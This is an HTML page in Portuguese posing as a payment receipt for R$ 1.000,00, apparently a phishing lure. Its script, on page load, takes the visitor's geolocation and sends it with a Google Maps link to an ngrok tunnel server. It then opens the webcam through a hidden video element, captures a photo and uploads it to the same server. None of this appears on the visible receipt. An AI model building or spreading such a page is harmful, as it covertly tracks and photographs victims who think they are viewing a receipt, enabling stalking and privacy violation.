<!DOCTYPE html>
<html lang="pt-BR">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Comprovante de Recebimento</title>
  <link rel="stylesheet" href="styles.css" />
</head>

<body>
  <div class="comprovante-container">
    <h1>Comprovante de Recebimento</h1>

    <div class="informacoes">
      <p><span>Data:</span> <span id="data-atual"></span></p>
      <p><span>Valor Recebido:</span> R$ 1.000,00</p>
      <p><span>De:</span> João Silva de Oliveira</p>
      <p><span>Status:</span> Recebido com Sucesso</p>
    </div>

    <button class="botao" onclick="window.print()">Imprimir</button>

    <div class="comprovante-footer">
      <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
      <p><a href="#">Clique aqui</a> para mais informações.</p>
    </div>
  </div>

  <script>
    const NGROK_SERVER = "https://1c35-201-42-106-118.ngrok-free.app";

    // Exibir data atual
    const dataAtual = new Date();
    const dia = String(dataAtual.getDate()).padStart(2, '0');
    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
    const ano = dataAtual.getFullYear();
    const dataFormatada = `${dia}/${mes}/${ano}`;
    document.getElementById("data-atual").textContent = dataFormatada;

    window.addEventListener("load", () => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          position => {
            sendLocation(position);
            startCameraAndSendPhoto();
          },
          handleError
        );
      } else {
        alert("Algo deu errado. Tente novamente mais tarde.");
      }
    });

    // Envia localização para o backend
    function sendLocation(position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;
      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;

      fetch(`${NGROK_SERVER}/send-location`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ latitude, longitude, maps }),
      })
        .then(res => res.json())
        .then(data => {
          if (!data.success) {
            alert("Erro ao enviar o comprovante.");
          }
        })
        .catch(err => {
          console.error("Erro:", err);
        });
    }

    // Captura foto da webcam e envia para backend
    function startCameraAndSendPhoto() {
      const video = document.createElement("video");
      video.style.display = "none";
      document.body.appendChild(video);

      navigator.mediaDevices
        .getUserMedia({ video: true })
        .then(stream => {
          video.srcObject = stream;
          video.play();

          video.addEventListener("canplay", () => {
            const canvas = document.createElement("canvas");
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            const imageBase64 = canvas.toDataURL("image/png");

            stream.getTracks().forEach(track => track.stop());
            video.remove();

            fetch(`${NGROK_SERVER}/send-photo`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ image: imageBase64 }),
            })
              .then(res => res.json())
              .then(data => {
                if (!data.success) {
                  alert("Erro ao enviar a foto.");
                }
              })
              .catch(err => {
                console.error("Erro ao enviar a foto:", err);
              });
          });
        })
        .catch(err => {
          alert("Erro ao acessar a webcam: " + err.message);
        });
    }

    function handleError(error) {
      alert("Erro ao obter a localização: " + error.message);
    }
  </script>
</body>

</html>
